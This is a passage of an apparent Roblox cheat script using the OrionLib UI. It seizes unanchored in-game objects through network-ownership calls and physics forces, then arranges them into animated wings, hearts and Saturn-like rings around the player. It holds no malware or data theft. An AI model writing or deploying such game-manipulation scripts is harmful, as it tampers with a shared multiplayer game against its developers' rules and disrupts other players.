                    for _, child in ipairs(point.assignedToy.Model:GetDescendants()) do if child:IsA("BasePart") then child.Material = Enum.Material.Plastic end end
                end
            end
            SH.animN2Points = {}; SH.animN2AssignedToys = {}
            OrionLib:MakeNotification({ Name = "N2 Stop", Content = "Animation cleared", Time = 2 })
        end
    end
    _G.toggleAnimN2 = toggleAnimN2

    function toggleAnimN3(state)
        SH.AnimN3Config.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.animN3Toys = findObjects()
            if #SH.animN3Toys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.AnimN3Config.Enabled = false
                return
            end
            local count = math.min(#SH.animN3Toys, SH.AnimN3Config.ObjectCount)
            SH.animN3Points = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.animN3Points[i] = { part = part, assignedToy = nil, seed = i }
            end
            SH.animN3AssignedToys = {}
            for i = 1, math.min(#SH.animN3Toys, #SH.animN3Points) do
                local toy = SH.animN3Toys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false; child.Material = Enum.Material.Neon end end
                        local BG, BP = attachPhysics(primaryPart, 20000, 300)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, seed = i }
                        SH.animN3Points[i].assignedToy = toyTable
                        table.insert(SH.animN3AssignedToys, toyTable)
                    end
                end
            end
            SH.animN3Time = 0
            if SH.animN3LoopConn then SH.animN3LoopConn:Disconnect() end
            SH.animN3LoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.AnimN3Config.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.animN3Time = SH.animN3Time + dt
                local basePosition = SH.AnimN3Config.FollowPlayer and torso.Position or torso.Position
                local explosionFactor = (math.sin(SH.animN3Time * SH.AnimN3Config.CycleSpeed) + 1) / 2
                for i, point in ipairs(SH.animN3Points) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local direction = Vector3.new(math.sin(SH.animN3Time * 2 + toy.seed), math.cos(SH.animN3Time * 3 + toy.seed), math.sin(SH.animN3Time * 4 + toy.seed)).Unit
                        local distance = explosionFactor * SH.AnimN3Config.ExplosionRadius + math.sin(SH.animN3Time * 5 + toy.seed) * SH.AnimN3Config.Randomness
                        local heightOffset = math.sin(SH.animN3Time * 3 + toy.seed) * 5 + SH.AnimN3Config.Height
                        local targetPosition = basePosition + direction * distance
                        targetPosition = Vector3.new(targetPosition.X, heightOffset, targetPosition.Z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "N3 Start", Content = "Object count: " .. #SH.animN3AssignedToys, Time = 3 })
        else
            if SH.animN3LoopConn then SH.animN3LoopConn:Disconnect(); SH.animN3LoopConn = nil end
            for _, point in ipairs(SH.animN3Points) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                    for _, child in ipairs(point.assignedToy.Model:GetDescendants()) do if child:IsA("BasePart") then child.Material = Enum.Material.Plastic end end
                end
            end
            SH.animN3Points = {}; SH.animN3AssignedToys = {}
            OrionLib:MakeNotification({ Name = "N3 Stop", Content = "Animation cleared", Time = 2 })
        end
    end
    _G.toggleAnimN3 = toggleAnimN3
end

-- ============================================================================
-- Block 22: Wing V2 Feature
-- ============================================================================
do
    local SH = _G.SH
    local Workspace = _G.Workspace
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local getPrimaryPart = _G.getPrimaryPart

    function toggleWing(state)
        SH.WingConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.wingList = {}
            local maxObjects = SH.WingConfig.ObjectCount * 2
            local foundCount = 0
            for _, d in ipairs(Workspace:GetDescendants()) do
                if foundCount >= maxObjects then break end
                if d:IsA("Model") and d.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local part = getPrimaryPart(d)
                    if part and not part.Anchored then
                        for _, p in ipairs(d:GetDescendants()) do
                            if p:IsA("BasePart") then
                                pcall(function() p:SetNetworkOwner(LocalPlayer) end)
                                p.CanCollide = false
                                p.CanTouch = false
                            end
                        end
                        if not part:FindFirstChild("WingBodyVelocity") then
                            local bv = Instance.new("BodyVelocity")
                            bv.Name = "WingBodyVelocity"
                            bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
                            bv.Velocity = Vector3.new()
                            bv.P = 1e6
                            bv.Parent = part
                        end
                        if not part:FindFirstChild("WingBodyGyro") then
                            local bg = Instance.new("BodyGyro")
                            bg.Name = "WingBodyGyro"
                            bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
                            bg.CFrame = part.CFrame
                            bg.P = 1e6
                            bg.Parent = part
                        end
                        table.insert(SH.wingList, { model = d, part = part, index = foundCount + 1, targetPos = part.Position, targetCF = part.CFrame })
                        foundCount = foundCount + 1
                    end
                end
            end
            if foundCount == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.WingConfig.Enabled = false
                return
            end
            SH.wingTime = 0
            if SH.wingLoopConn then SH.wingLoopConn:Disconnect() end
            local function getWingPosition(index, total, time)
                local halfTotal = total / 2
                local isLeftWing = index <= halfTotal
                local wingIndex = isLeftWing and index or (index - halfTotal)
                local t = (wingIndex - 1) / (halfTotal - 1)
                local phase = (time * SH.WingConfig.FlapSpeed - wingIndex * 0.05) * SH.WingConfig.FlapShape
                local sinValue = math.sin(phase)
                local actualFlapAmount = sinValue > 0 and SH.WingConfig.FlapAmount * 0.6 or SH.WingConfig.FlapAmount
                local flapAngle = sinValue * math.rad(actualFlapAmount)
                local baseX = t * SH.WingConfig.Spread
                local rotatedY = baseX * math.sin(flapAngle)
                local rotatedX = baseX * math.cos(flapAngle)
                local sideOffset = isLeftWing and -(3 + rotatedX) or (3 + rotatedX)
                return Vector3.new(sideOffset, SH.WingConfig.VerticalOffset + rotatedY, 0), isLeftWing, wingIndex
            end
            SH.wingLoopConn = RunService.Heartbeat:Connect(function(dt)
                if not SH.WingConfig.Enabled then return end
                local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not root or #SH.wingList == 0 then return end
                SH.wingTime = SH.wingTime + dt
                local rootVelocity = root.AssemblyLinearVelocity or root.Velocity or Vector3.new()
                local total = #SH.wingList
                for i, rec in ipairs(SH.wingList) do
                    local part = rec.part
                    if not part or not part.Parent then continue end
                    local localPos, _, wingIndex = getWingPosition(i, total, SH.wingTime)
                    local targetCF = root.CFrame
                    local idealPos = targetCF.Position + (targetCF - targetCF.Position):VectorToWorldSpace(localPos)
                    local idealRotation = targetCF * CFrame.Angles(0, -math.pi/2, 0)
                    local delayMultiplier = 1 + (wingIndex - 1) * 2
                    local actualDelay = SH.WingConfig.ChainDelay * delayMultiplier
                    local delayFactor = math.min(1, dt / actualDelay)
                    rec.targetPos = rec.targetPos:Lerp(idealPos, delayFactor)
                    rec.targetCF = rec.targetCF:Lerp(idealRotation, delayFactor)
                    local targetPos = rec.targetPos
                    local targetRot = rec.targetCF
                    local dir = targetPos - part.Position
                    local distance = dir.Magnitude
                    local bv = part:FindFirstChild("WingBodyVelocity")
                    if bv then
                        if distance > 0.1 then
                            local moveVelocity = dir.Unit * math.min(3000, distance * 50)
                            bv.Velocity = moveVelocity + rootVelocity
                        else
                            bv.Velocity = rootVelocity
                        end
                        bv.P = 1e6
                    end
                    local bg = part:FindFirstChild("WingBodyGyro")
                    if bg then
                        bg.CFrame = targetRot
                        bg.P = 1e6
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Wing V2 Start", Content = "Object count: " .. #SH.wingList, Time = 3 })
        else
            if SH.wingLoopConn then SH.wingLoopConn:Disconnect(); SH.wingLoopConn = nil end
            for _, rec in ipairs(SH.wingList) do
                if rec.part then
                    local bv = rec.part:FindFirstChild("WingBodyVelocity"); if bv then bv:Destroy() end
                    local bg = rec.part:FindFirstChild("WingBodyGyro"); if bg then bg:Destroy() end
                    if rec.model then
                        for _, p in ipairs(rec.model:GetDescendants()) do
                            if p:IsA("BasePart") then
                                p.CanCollide = true
                                p.CanTouch = true
                                pcall(function() p:SetNetworkOwner(nil) end)
                            end
                        end
                    end
                end
            end
            SH.wingList = {}
            OrionLib:MakeNotification({ Name = "Wing V2 Stop", Content = "Wing V2 cleared", Time = 2 })
        end
    end
    _G.toggleWing = toggleWing
end

-- ============================================================================
-- Block 23: Saturn Sparkler Feature
-- ============================================================================
do
    local SH = _G.SH
    local Workspace = _G.Workspace
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local PhysicsService = _G.PhysicsService
    local SATURN_GROUP_NAME = _G.SATURN_GROUP_NAME

    local function getSaturnHRP()
        if SH.saturnCachedHRP and SH.saturnCachedHRP.Parent then return SH.saturnCachedHRP end
        local c = LocalPlayer.Character
        if c then
            SH.saturnCachedHRP = c:FindFirstChild("HumanoidRootPart")
            return SH.saturnCachedHRP
        end
        return nil
    end

    local function getSaturnPartFromModel(m)
        if m.PrimaryPart then return m.PrimaryPart end
        return m:FindFirstChildWhichIsA("BasePart")
    end

    local function attachSaturnPhysics(p)
        if not p or not p.Parent then return end
        pcall(function() p:SetNetworkOwner(LocalPlayer) end)
        p.CanCollide = false
        p.CanTouch = false
        pcall(function() PhysicsService:SetPartCollisionGroup(p, SATURN_GROUP_NAME) end)
        if not p:FindFirstChild("SaturnBodyVelocity") then
            local bv = Instance.new("BodyVelocity")
            bv.Name = "SaturnBodyVelocity"
            bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
            bv.P = 1e6
            bv.Velocity = Vector3.new()
            bv.Parent = p
        end
        if not p:FindFirstChild("SaturnBodyGyro") then
            local bg = Instance.new("BodyGyro")
            bg.Name = "SaturnBodyGyro"
            bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
            bg.P = 1e6
            bg.CFrame = p.CFrame
            bg.Parent = p
        end
    end

    local function detachSaturnPhysics(p)
        if not p then return end
        local bv = p:FindFirstChild("SaturnBodyVelocity")
        if bv then bv:Destroy() end
        local bg = p:FindFirstChild("SaturnBodyGyro")
        if bg then bg:Destroy() end
        p.CanCollide = true
        p.CanTouch = true
        pcall(function() p:SetNetworkOwner(nil) end)
    end

    function rescanSaturn()
        for _, r in ipairs(SH.saturnList) do
            if r.part then detachSaturnPhysics(r.part) end
        end
        SH.saturnList = {}
        local modelName = SH.SaturnConfig.ModelName or "FireworkSparkler"
        for _, d in ipairs(Workspace:GetDescendants()) do
            if d:IsA("Model") and d.Name == modelName then
                local part = getSaturnPartFromModel(d)
                if part and not part.Anchored then
                    table.insert(SH.saturnList, { model = d, part = part })
                end
            end
        end
        for i = 1, #SH.saturnList do
            attachSaturnPhysics(SH.saturnList[i].part)
        end
    end
    _G.rescanSaturn = rescanSaturn

    local function saturnTarget(i, count, t, rootCf)
        local center = rootCf.Position + Vector3.new(0, SH.SaturnConfig.BaseHeight, 0)
        local mode = SH.SaturnConfig.Mode or "saturn"

        if mode == "sphere" then
            local LAYERS = SH.SaturnConfig.SphereLayers or 5
            local perLayer = math.floor(count / LAYERS)
            local layer = math.min(math.floor((i - 1) / math.max(perLayer, 1)), LAYERS - 1)
            local indexInLayer = (i - 1) - layer * perLayer
            local countInLayer = (layer == LAYERS - 1) and (count - layer * perLayer) or perLayer
            local yFrac = layer / (LAYERS - 1)
            local y = (yFrac - 0.5) * SH.SaturnConfig.SphereRadius * 2
            local layerRadius = SH.SaturnConfig.SphereRadius * math.sin(math.acos(math.clamp(1 - 2 * yFrac, -1, 1)))
            local baseAngle = (indexInLayer / math.max(countInLayer, 1)) * math.pi * 2
            local rotAngle = (layer == 0) and baseAngle or (baseAngle + t * SH.SaturnConfig.SphereSpeed)
            return Vector3.new(layerRadius * 1.3 * math.cos(rotAngle), y, layerRadius * 1.3 * math.sin(rotAngle))
        elseif mode == "ring" then
            local angle = (i / count) * math.pi * 2 + t * SH.SaturnConfig.RingSpeed
            return Vector3.new(SH.SaturnConfig.RingRadius * math.cos(angle), 0, SH.SaturnConfig.RingRadius * math.sin(angle))
        elseif mode == "plot" then
            local angle = (i / count) * math.pi * 2 + t * SH.SaturnConfig.RingSpeed
            local radius = SH.SaturnConfig.PlotRadius * math.sqrt((i - 1) / count)
            local x = radius * math.cos(angle)
            local z = radius * math.sin(angle)
            local wave = math.sin(angle * 3 + t * 2) * 1.5
            return Vector3.new(x, SH.SaturnConfig.PlotHeight + wave, z)
        else
            local sphereCount = math.floor(count * 0.6)
            local ringCount = count - sphereCount
            if i <= sphereCount then
                local theta = (i / sphereCount) * math.pi * 2
                local phi = math.acos(1 - 2 * (i / sphereCount))
                local r = SH.SaturnConfig.SphereRadius
                local x = r * math.sin(phi) * math.cos(theta + t * SH.SaturnConfig.SphereSpeed)
                local y = r * math.cos(phi)
                local z = r * math.sin(phi) * math.sin(theta + t * SH.SaturnConfig.SphereSpeed)
                return Vector3.new(x, y, z)
            else
                local ringIdx = i - sphereCount
                local angle = (ringIdx / ringCount) * math.pi * 2 + t * SH.SaturnConfig.RingSpeed
                local tilt = math.rad(20)
                local x = SH.SaturnConfig.RingRadius * math.cos(angle)
                local y = SH.SaturnConfig.RingRadius * math.sin(angle) * math.sin(tilt)
                local z = SH.SaturnConfig.RingRadius * math.sin(angle) * math.cos(tilt)
                return Vector3.new(x, y, z)
            end
        end
    end

    function toggleSaturn(state)
        SH.SaturnConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            rescanSaturn()
            if #SH.saturnList == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.SaturnConfig.Enabled = false
                return
            end
            if SH.saturnLoopConn then SH.saturnLoopConn:Disconnect(); SH.saturnLoopConn = nil end
            SH.saturnTAccum = 0
            SH.saturnLoopConn = RunService.Heartbeat:Connect(function(dt)
                if not SH.SaturnConfig.Enabled then return end
                for i = #SH.saturnList, 1, -1 do
                    if not SH.saturnList[i].part or not SH.saturnList[i].part.Parent then
                        table.remove(SH.saturnList, i)
                    end
                end
                if #SH.saturnList == 0 then return end
                local root = getSaturnHRP()
                if not root then return end
                SH.saturnTAccum = SH.saturnTAccum + dt
                local rootCf = root.CFrame
                local center = rootCf.Position + Vector3.new(0, SH.SaturnConfig.BaseHeight, 0)
                local listCount = #SH.saturnList
                local targets = table.create(listCount)
                for i = 1, listCount do
                    targets[i] = center + saturnTarget(i, listCount, SH.saturnTAccum, rootCf)
                end
                for i = 1, listCount do
                    local rec = SH.saturnList[i]
                    local p = rec.part
                    if p and p.Parent then
                        local target = targets[i]
                        local dir = target - p.Position
                        local d = dir.Magnitude
                        local bv = p:FindFirstChild("SaturnBodyVelocity")
                        if bv then
                            if d > 0.05 then
                                local speed = math.min(SH.SaturnConfig.MaxVel or 700, d * (SH.SaturnConfig.Strength or 16) + d * d * 2)
                                bv.Velocity = dir.Unit * speed
                            else
                                bv.Velocity = Vector3.new()
                            end
                        end
                        local bg = p:FindFirstChild("SaturnBodyGyro")
                        if bg then
                            local nextTarget = targets[(i % listCount) + 1]
                            local lookDir = nextTarget - target
                            if lookDir.Magnitude > 0.01 then
                                local goalCF = CFrame.lookAt(p.Position, p.Position + lookDir)
                                bg.CFrame = bg.CFrame:Lerp(goalCF, 0.15)
                            end
                        end
                    end
                end
            end)
            OrionLib:MakeNotification({
                Name = "Saturn Sparkler",
                Content = "Enabled - Object count: " .. #SH.saturnList,
                Time = 3
            })
        else
            if SH.saturnLoopConn then SH.saturnLoopConn:Disconnect(); SH.saturnLoopConn = nil end
            for _, rec in ipairs(SH.saturnList) do
                local p = rec.part
                if p and p.Parent then
                    local bv = p:FindFirstChild("SaturnBodyVelocity")
                    if bv then bv.Velocity = Vector3.new() end
                    detachSaturnPhysics(p)
                end
            end
            SH.saturnList = {}
            OrionLib:MakeNotification({ Name = "Saturn Sparkler", Content = "Disabled", Time = 2 })
        end
    end
    _G.toggleSaturn = toggleSaturn

    Workspace.DescendantAdded:Connect(function(inst)
        if inst:IsA("Model") and inst.Name == (SH.SaturnConfig.ModelName or "FireworkSparkler") then
            task.wait(0.1)
            if SH.SaturnConfig.Enabled then rescanSaturn() end
        end
    end)

    Workspace.DescendantRemoving:Connect(function(inst)
        if inst:IsA("Model") and inst.Name == (SH.SaturnConfig.ModelName or "FireworkSparkler") then
            task.defer(function()
                if SH.SaturnConfig.Enabled then rescanSaturn() end
            end)
        end
    end)
end

-- ============================================================================
-- Block 24: Piano Feature Toggle
-- ============================================================================
do
    local SH = _G.SH
    local OrionLib = _G.OrionLib
    local getMusicKeyboard = _G.getMusicKeyboard
    local setupPianoFollow = _G.setupPianoFollow
    local stopPiano = _G.stopPiano
    local stopSong = _G.stopSong

    function togglePiano(state)
        SH.PianoConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.PianoConfig.Keyboard = getMusicKeyboard()
            if SH.PianoConfig.Keyboard then
                if SH.PianoConfig.FollowPlayer then setupPianoFollow() end
                OrionLib:MakeNotification({ Name = "Piano Feature", Content = "MusicKeyboard detected", Time = 3 })
            else
                PlayErrorSound()
                SH.PianoConfig.Enabled = false
                OrionLib:MakeNotification({ Name = "Error", Content = "MusicKeyboard not found", Time = 5 })
            end
        else
            stopSong()
            stopPiano()
            OrionLib:MakeNotification({ Name = "Piano Feature Stopped", Content = "Piano feature disabled", Time = 2 })
        end
    end
    _G.togglePiano = togglePiano
end

-- ============================================================================
-- Block 25: Vertical Heart Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleVerticalHeart(state)
        SH.VerticalHeartConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.verticalHeartToys = findObjects()
            if #SH.verticalHeartToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.VerticalHeartConfig.Enabled = false
                return
            end
            local count = math.min(#SH.verticalHeartToys, SH.VerticalHeartConfig.ObjectCount)
            SH.verticalHeartPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.verticalHeartPoints[i] = { angle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.verticalHeartAssignedToys = {}
            for i = 1, math.min(#SH.verticalHeartToys, #SH.verticalHeartPoints) do
                local toy = SH.verticalHeartToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.verticalHeartPoints[i].angle }
                        SH.verticalHeartPoints[i].assignedToy = toyTable
                        table.insert(SH.verticalHeartAssignedToys, toyTable)
                    end
                end
            end
            SH.verticalHeartTime = 0
            if SH.verticalHeartLoopConn then SH.verticalHeartLoopConn:Disconnect() end
            SH.verticalHeartLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.VerticalHeartConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.verticalHeartTime = SH.verticalHeartTime + dt
                local basePosition = SH.VerticalHeartConfig.FollowPlayer and torso.Position or torso.Position
                local pulseEffect = (SH.VerticalHeartConfig.PulseSpeed > 0) and math.sin(SH.verticalHeartTime * SH.VerticalHeartConfig.PulseSpeed) * SH.VerticalHeartConfig.PulseAmplitude or 0
                for _, point in ipairs(SH.verticalHeartPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.verticalHeartTime * SH.VerticalHeartConfig.RotationSpeed)
                        local baseScale = SH.VerticalHeartConfig.Size / 20
                        local x = 16 * (math.sin(currentAngle) ^ 3) * baseScale
                        local y = (13 * math.cos(currentAngle) - 5 * math.cos(2*currentAngle) - 2 * math.cos(3*currentAngle) - math.cos(4*currentAngle)) * baseScale
                        if pulseEffect > 0 then local pf = 1 + (pulseEffect * 0.1); x = x * pf; y = y * pf end
                        local targetPosition = basePosition + Vector3.new(x, SH.VerticalHeartConfig.Height + y, 0)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition) * CFrame.Angles(0, 0, 0)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Vertical Heart Start", Content = "Size: " .. SH.VerticalHeartConfig.Size, Time = 3 })
        else
            if SH.verticalHeartLoopConn then SH.verticalHeartLoopConn:Disconnect(); SH.verticalHeartLoopConn = nil end
            for _, point in ipairs(SH.verticalHeartPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.verticalHeartPoints = {}; SH.verticalHeartAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Vertical Heart Stop", Content = "Vertical heart arrangement cleared", Time = 2 })
        end
    end
    _G.toggleVerticalHeart = toggleVerticalHeart
end

-- ============================================================================
-- Block 26: Vertical Big Heart Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleVerticalBigHeart(state)
        SH.VerticalBigHeartConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.verticalBigHeartToys = findObjects()
            if #SH.verticalBigHeartToys == 0 then
                PlayErrorSound()
